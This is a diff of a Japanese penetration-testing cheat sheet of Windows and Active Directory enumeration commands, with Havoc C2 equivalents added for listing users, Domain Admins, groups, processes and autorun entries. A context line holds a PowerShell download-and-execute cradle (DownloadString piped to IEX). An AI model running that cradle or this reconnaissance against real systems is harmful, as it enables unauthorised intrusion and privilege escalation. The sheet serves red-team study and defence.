@@ -6,44 +6,81 @@ $wc=New-Object System.Net.WebClient; $wc.DownloadString("URL") | IEX;
 ```
 
 ## ユーザ
-- ユーザの確認：
+<details>
+<summary>ユーザの確認</summary>
+	
+#### ドメインユーザの列挙
 ```
-Get-LocalUser
 net user /domain
+---
+havoc:
+domainenum
+```
 
-#Domain Adminsユーザの列挙：
+#### ローカルユーザの列挙
+```
+net users
+Get-LocalUser
+---
+havoc:
+userenum
+```
+#### Domain Adminsユーザの列挙
+```
 ([adsisearcher]"(&(objectClass=user)(objectCategory=person))").FindAll() | ? { $_.Properties.memberof -match "CN=Domain Admins" } | % { $_.Properties.samaccountname }
+---
+havoc:
+netGroupListMembers "Domain Admins"
 ```
-
-- グループの確認：
+#### ローカル管理者の列挙
 ```
-Get-LocalGroup
-net group /domain
-		
-Get-ADGroupMember -Identity [グループ名] -Server [DCホスト名]
 Get-LocalGroupMember Administrators
+---
+havoc：
+netLclGrpLstMmbrs administrators
 ```
-		
-- ログインしているユーザ：
+#### ログインしているユーザ：
 ```
 qwinsta
 ```
+</details>
+
+<details>
+<summary>グループの確認</summary>
+
+```
+net localgroup
+net group /domain
+		
+Get-DomainGroupMember -Identity [グループ名] -Server [DCホスト名]
+Get-LocalGroupMember Administrators
+```
+</details>
+
 
 ## プロセス
-- プロセス一覧の表示：
+<details>
+<summary>プロセス一覧の表示</summary>
+	
 ```
 Get-WmiObject Win32_Process | where {$_.ProcessName -notlike "svchost*" } | select processid,name,@{Label="Owner";Expression={$_.GetOwner().User}},commandline | ft -AutoSize
 		
 Get-Process -IncludeUserName
 ```
+</details>
 
-- インストールされているソフトウェアの確認：
+<details>
+<summary>インストールされているソフトウェアの確認</summary>
+	
 ```
 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
+</details>
 
-- 自動起動プロセスの確認：
+<details>
+<summary>自動起動プロセスの確認</summary>
+
 ```
 Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
 Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
@@ -52,6 +89,7 @@ Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\C
 Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
 Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 ```
+</details>
 
 ## サービス
 - サービス一覧の表示：
